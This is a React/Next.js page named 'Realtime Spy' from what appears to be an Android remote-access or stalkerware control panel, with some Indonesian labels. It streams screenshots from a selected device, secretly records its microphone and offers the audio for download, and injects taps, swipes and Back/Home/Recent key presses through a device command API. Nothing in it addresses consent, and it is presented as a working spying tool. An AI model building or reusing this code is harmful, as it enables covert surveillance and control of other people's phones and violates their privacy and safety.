'use client'
import { Suspense, useState, useCallback, useRef, useEffect } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import {
  Eye, Play, Square, ChevronLeft, Home, LayoutGrid,
  Mic, MicOff, RefreshCw, Download, Circle,
} from 'lucide-react'

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)) }

async function apiCmd(deviceId: string, command: string, timeoutMs = 14000): Promise<string> {
  const sentAt = Date.now()
  await fetch('/api/device/command', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command }),
  })
  await sleep(450)
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    try {
      const d = await (await fetch(`/api/device/result?deviceId=${deviceId}`)).json()
      const hit = (d.history ?? [])
        .filter((h: { command: string; result: string; timestamp: string }) =>
          h.command === command && new Date(h.timestamp).getTime() > sentAt - 100)
        .sort((a: { timestamp: string }, b: { timestamp: string }) =>
          new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
      if (hit?.result) return hit.result as string
    } catch {}
    await sleep(350)
  }
  return ''
}

async function grabFrame(deviceId: string, maxW: number, qual: number): Promise<string> {
  const cmd = `screenshot:${maxW}:${qual}`
  const sentAt = Date.now()
  await fetch('/api/device/command', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command: cmd }),
  })
  await sleep(500)
  const deadline = Date.now() + 16000
  while (Date.now() < deadline) {
    try {
      const d = await (await fetch(`/api/device/result?deviceId=${deviceId}`)).json()
      const hit = (d.history ?? [])
        .filter((h: { command: string; result: string; timestamp: string }) =>
          h.command === cmd && new Date(h.timestamp).getTime() > sentAt - 100)
        .sort((a: { timestamp: string }, b: { timestamp: string }) =>
          new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
      if (hit?.result && !hit.result.startsWith('ERROR'))
        return `data:image/jpeg;base64,${(hit.result as string).trim()}`
    } catch {}
    await sleep(350)
  }
  return ''
}

const MIC_DURATIONS = [3, 5, 10, 15, 30]

function SpyContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()

  const [frame, setFrame]     = useState('')
  const [live, setLive]       = useState(false)
  const [fps, setFps]         = useState(0)
  const [frameN, setFrameN]   = useState(0)

  // Mic
  const [micDur, setMicDur]   = useState(5)
  const [recording, setRecording] = useState(false)
  const [audioUrl, setAudioUrl]   = useState('')
  const [micErr, setMicErr]       = useState('')

  // touch
  const [tapping, setTapping] = useState(false)
  const imgRef   = useRef<HTMLImageElement>(null)
  const dragRef  = useRef<{ x: number; y: number } | null>(null)
  const dragging = useRef(false)

  const liveRef  = useRef(false)
  const capRef   = useRef(false)
  const fpsRef   = useRef<number[]>([])
  const [qualIdx, setQualIdx] = useState(0) // 0=Fast(480), 1=HD(720)

  const QS = [{ maxW: 480, qual: 60 }, { maxW: 720, qual: 70 }]
  const q = QS[qualIdx]

  /* ── Pipeline loop — only one frame in-flight at a time ── */
  const startLive = useCallback(async () => {
    liveRef.current = true
    setLive(true)
    setFrameN(0)
    fpsRef.current = []
    while (liveRef.current && selectedId) {
      if (capRef.current) { await sleep(80); continue }
      capRef.current = true
      const t0 = Date.now()
      try {
        const url = await grabFrame(selectedId, q.maxW, q.qual)
        if (url) {
          setFrame(url)
          setFrameN(n => n + 1)
          const elapsed = Date.now() - t0
          fpsRef.current.push(elapsed)
          if (fpsRef.current.length > 5) fpsRef.current.shift()
          const avg = fpsRef.current.reduce((a, b) => a + b, 0) / fpsRef.current.length
          setFps(Math.round(1000 / avg * 10) / 10)
        }
      } catch {}
      capRef.current = false
      await sleep(30) // micro-yield for React
    }
    setLive(false)
  }, [selectedId, q.maxW, q.qual])

  const stopLive = () => { liveRef.current = false }

  useEffect(() => { liveRef.current = false }, [selectedId])

  /* ── Touch handlers ── */
  const getPct = (cx: number, cy: number) => {
    const el = imgRef.current; if (!el) return null
    const r = el.getBoundingClientRect()
    return { x: Math.max(0, Math.min(1, (cx - r.left) / r.width)), y: Math.max(0, Math.min(1, (cy - r.top) / r.height)) }
  }
  const onDown = (e: React.PointerEvent<HTMLImageElement>) => {
    const p = getPct(e.clientX, e.clientY); if (!p) return
    dragRef.current = { x: p.x, y: p.y }; dragging.current = false
    ;(e.currentTarget as HTMLElement).setPointerCapture(e.pointerId)
    e.preventDefault()
  }
  const onMove = (e: React.PointerEvent<HTMLImageElement>) => {
    if (!dragRef.current) return
    const p = getPct(e.clientX, e.clientY); if (!p) return
    if (Math.abs(p.x - dragRef.current.x) > 0.012 || Math.abs(p.y - dragRef.current.y) > 0.012) dragging.current = true
  }
  const onUp = async (e: React.PointerEvent<HTMLImageElement>) => {
    if (!dragRef.current || !selectedId) return
    const p = getPct(e.clientX, e.clientY)
    if (p) {
      if (dragging.current) {
        const { x: x1, y: y1 } = dragRef.current
        const dur = Math.round(Math.hypot(p.x - x1, p.y - y1) * 700 + 150)
        apiCmd(selectedId, `input_swipe_pct:${x1.toFixed(4)}:${y1.toFixed(4)}:${p.x.toFixed(4)}:${p.y.toFixed(4)}:${dur}`, 5000)
      } else {
        setTapping(true)
        await apiCmd(selectedId, `input_tap_pct:${p.x.toFixed(4)}:${p.y.toFixed(4)}`, 5000)
        setTapping(false)
      }
    }
    dragRef.current = null; dragging.current = false
  }

  /* ── Mic recording ── */
  const recordMic = async () => {
    if (!selectedId || recording) return
    setRecording(true); setMicErr(''); setAudioUrl('')
    try {
      const b64 = await apiCmd(selectedId, `record_mic:${micDur}`, (micDur + 10) * 1000)
      if (b64 && !b64.startsWith('ERROR')) {
        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0))
        const blob = new Blob([bytes], { type: 'audio/3gpp' })
        setAudioUrl(URL.createObjectURL(blob))
      } else {
        setMicErr(b64 || 'Mic recording gagal')
      }
    } catch { setMicErr('Error recording') }
    finally { setRecording(false) }
  }

  const downloadAudio = () => {
    if (!audioUrl) return
    const a = document.createElement('a')
    a.href = audioUrl; a.download = `mic_${Date.now()}.3gp`; a.click()
  }

  return (
    <div className="flex h-[100dvh] overflow-hidden">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />

      <main className="flex-1 page-fixed min-w-0">

        {/* ── Header ── */}
        <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-android-border bg-android-surface">
          <Eye size={14} className="text-android-red shrink-0" />
          <span className="text-sm font-bold text-white flex-1">Realtime Spy</span>

          {live && <span className="text-[10px] text-android-green font-mono">{fps > 0 ? `${fps} fps` : '…'}</span>}
          {frameN > 0 && <span className="text-[10px] text-android-muted font-mono">#{frameN}</span>}

          <div className={`w-2 h-2 rounded-full shrink-0 ${connected ? 'bg-android-green' : 'bg-android-red'}`} />

          {/* Quality toggle */}
          <button onClick={() => setQualIdx(i => (i + 1) % 2)} disabled={live}
            className="px-1.5 py-0.5 text-[10px] rounded border border-android-border text-android-muted disabled:opacity-40">
            {qualIdx === 0 ? '480p' : '720p'}
          </button>

          {!live ? (
            <button onClick={startLive} disabled={!connected}
              className="flex items-center gap-1 px-2.5 py-1 text-[11px] rounded-lg bg-android-red text-white font-semibold disabled:opacity-30">
              <Play size={11} className="fill-white" /> Spy
            </button>
          ) : (
            <button onClick={stopLive}
              className="flex items-center gap-1 px-2.5 py-1 text-[11px] rounded-lg bg-android-border text-white font-semibold animate-pulse">
              <Square size={11} className="fill-white" /> Stop
            </button>
          )}
        </div>

        {/* ── Screen — fills everything ── */}
        <div className="flex-1 min-h-0 bg-black overflow-hidden relative select-none">
          {!connected && (
            <div className="absolute inset-0 flex flex-col items-center justify-center gap-3">
              <Circle size={40} className="text-android-border" />
              <p className="text-android-muted text-sm">Connect device terlebih dahulu</p>
            </div>
          )}
          {connected && !frame && (
            <div className="absolute inset-0 flex flex-col items-center justify-center gap-3">
              <Eye size={40} className="text-android-border" />
              <p className="text-android-muted text-sm">Tekan <span className="text-android-red font-bold">Spy</span> untuk mulai streaming</p>
            </div>
          )}
          {frame && (
            <img
              ref={imgRef} src={frame} alt="spy"
              draggable={false}
              className={`w-full h-full object-contain transition-opacity duration-75 ${tapping ? 'opacity-70' : 'opacity-100'}`}
              style={{ touchAction: 'none', userSelect: 'none', cursor: 'crosshair' }}
              onPointerDown={onDown} onPointerMove={onMove} onPointerUp={onUp}
            />
          )}

          {/* LIVE indicator */}
          {live && (
            <div className="absolute top-2 left-2 flex items-center gap-1.5 bg-black/70 rounded-full px-2.5 py-1 pointer-events-none">
              <span className="w-2 h-2 rounded-full bg-android-red animate-pulse" />
              <span className="text-white text-xs font-mono font-bold">LIVE</span>
            </div>
          )}
          {tapping && (
            <div className="absolute top-2 right-2 bg-android-blue/80 rounded-full px-2 py-0.5 pointer-events-none">
              <span className="text-white text-[10px]">TAP</span>
            </div>
          )}
        </div>

        {/* ── Bottom bar — hardware keys + mic ── */}
        <div className="shrink-0 bg-android-surface border-t border-android-border">

          {/* Keys */}
          <div className="flex items-center justify-around px-2 py-2">
            {[
              { l: 'Back', k: 'KEYCODE_BACK', I: ChevronLeft },
              { l: 'Home', k: 'KEYCODE_HOME', I: Home },
              { l: 'Recent', k: 'KEYCODE_APP_SWITCH', I: LayoutGrid },
            ].map(({ l, k, I: Icon }) => (
              <button key={k}
                onClick={() => selectedId && apiCmd(selectedId, `input_key:${k}`, 5000)}
                disabled={!connected}
                className="flex flex-col items-center gap-1 px-4 py-2 rounded-xl border border-android-border text-android-muted hover:text-white hover:border-android-blue/40 disabled:opacity-30 active:scale-95 transition-all">
                <Icon size={18} />
                <span className="text-[10px]">{l}</span>
              </button>
            ))}
          </div>

          {/* Mic recorder */}
          <div className="flex items-center gap-2 px-3 pb-2 border-t border-android-border/30 pt-2">
            <Mic size={14} className="text-android-muted shrink-0" />
            <div className="flex gap-1">
              {MIC_DURATIONS.map(s => (
                <button key={s} onClick={() => setMicDur(s)} disabled={recording}
                  className={`px-1.5 py-0.5 text-[10px] rounded border transition-colors disabled:opacity-40 ${micDur===s?'bg-android-red/20 border-android-red/50 text-android-red':'border-android-border text-android-muted'}`}>
                  {s}s
                </button>
              ))}
            </div>
            <div className="flex-1" />
            {audioUrl && (
              <>
                <audio src={audioUrl} controls className="h-7" style={{ maxWidth: 120 }} />
                <button onClick={downloadAudio} className="p-1.5 rounded-lg border border-android-border text-android-muted hover:text-android-blue">
                  <Download size={12} />
                </button>
              </>
            )}
            {micErr && <span className="text-android-red text-[10px] truncate max-w-[100px]">{micErr}</span>}
            <button onClick={recordMic} disabled={!connected || recording}
              className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 text-xs rounded-xl font-semibold disabled:opacity-30 transition-all active:scale-95 ${recording ? 'bg-android-red text-white animate-pulse' : 'bg-android-red/10 border border-android-red/40 text-android-red hover:bg-android-red/20'}`}>
              {recording ? <><RefreshCw size={12} className="animate-spin" /> Rec {micDur}s…</> : <><Mic size={12} /> Rekam {micDur}s</>}
            </button>
          </div>
        </div>
      </main>
    </div>
  )
}

export default function SpyPage() {
  return (
    <Suspense fallback={<div className="flex h-[100dvh] items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <SpyContent />
    </Suspense>
  )
}
